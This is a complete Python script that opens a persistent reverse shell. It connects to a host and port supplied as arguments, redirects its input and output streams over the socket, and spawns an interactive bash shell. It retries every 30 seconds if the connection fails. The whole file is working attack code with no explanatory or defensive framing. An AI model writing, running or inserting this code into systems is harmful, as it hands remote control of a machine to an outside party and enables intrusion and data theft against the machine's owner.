import socket,os
import pty
import sys
import time

def main(arg):
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((arg[1], int(arg[2])))
            os.dup2(s.fileno(), 0)
            os.dup2(s.fileno(), 1)
            os.dup2(s.fileno(), 2)
            pty.spawn("/bin/bash")
        except Exception as e:
            print(e)
            time.sleep(30)


if __name__ == "__main__":
    if len(sys.argv) < 2:
        sys.exit()
    main(sys.argv)
